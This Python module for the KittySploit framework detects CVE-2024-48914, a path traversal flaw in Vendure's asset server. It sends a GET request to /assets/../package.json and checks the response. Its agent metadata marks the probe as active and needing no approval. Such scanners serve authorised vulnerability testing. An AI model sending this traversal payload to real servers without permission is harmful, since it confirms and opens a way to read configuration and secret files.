#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Vendure is an open-source headless commerce platform."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Vendure - Arbitrary File Read Detection',
        'description': "Vendure is an open-source headless commerce platform. Prior to versions 3.0.5 and 2.3.3, a vulnerability in Vendure's asset server plugin allows an attacker to craft a request which is able to traverse the server file system and retrieve the contents of arbitrary files, including sensitive data such as configuration files, environment variables, and other critical data stored on the server. In the same code path is an additional vector for crashing the server via a malformed URI.",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'vendure', 'lfi', 'file-read', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2024-48914',
            'https://github.com/EQSTLab/CVE-2024-48914',
            'https://github.com/vendure-ecommerce/vendure',
            'https://github.com/vendure-ecommerce/vendure/blob/801980e8f599c28c5059657a9d85dd03e3827992/packages/asset-server-plugin/src/plugin.ts#L352-L358',
            'https://github.com/vendure-ecommerce/vendure/commit/e2ee0c43159b3d13b51b78654481094fdd4850c5',
        ],
        'cve': 'CVE-2024-48914',
    }

    def run(self):
        r = self.http_request(method="GET", path='/assets/../package.json', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('application/octet-stream',)
        body_all = ('name', 'version', 'main', 'license',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='critical',
                reason="Vendure - Arbitrary File Read detected",
                path='/assets/../package.json',
            )
            return True
        return False

